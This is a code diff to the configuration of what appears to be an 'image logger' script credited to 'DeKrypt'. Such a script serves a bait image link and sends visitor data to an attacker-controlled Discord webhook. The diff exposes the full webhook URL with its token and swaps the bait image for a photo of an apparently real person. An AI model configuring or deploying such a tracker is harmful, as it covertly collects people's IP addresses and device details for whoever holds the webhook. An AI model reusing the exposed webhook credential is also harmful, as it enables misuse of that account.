@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1360719965883207774/alcTPD9cwek2YJa5BFtINbU45ayDGVcCnZ_4TJaSW4o9WRw1XXnifr1qbDb19hDDixz7",
-    "image": "https://cdn1.opensecrets.org/news/wp-content/uploads/2020/07/01144416/Trump-supporter-thumbs-up.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://images.sidearmdev.com/convert?url=https%3a%2f%2fdxbhsrqyrr690.cloudfront.net%2fsidearm.nextgen.sites%2fwashington.sidearmsports.com%2fimages%2f2024%2f8%2f15%2fSovde_Chad.png&type=webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
